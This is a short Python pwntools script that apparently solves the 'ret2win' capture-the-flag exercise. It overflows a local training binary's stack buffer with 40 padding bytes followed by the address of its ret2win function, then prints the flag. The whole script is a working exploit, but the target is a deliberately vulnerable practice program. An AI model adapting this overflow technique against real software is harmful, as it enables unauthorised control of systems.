#!/usr/bin/env python
from pwn import *

#definitions
e = ELF("ret2win", checksec = False)

#function
func = p64(e.symbols.ret2win) #ret2win func

#prefix
prefix = 40*'A'

#payload
payload = prefix + func

#exploit
io = process(e.path)
io.sendline(payload)
io.recvuntil("> ")
io.recvline()
io.recvline()

#flag
flag = io.recvline()
print 'FLAG==> ' + flag
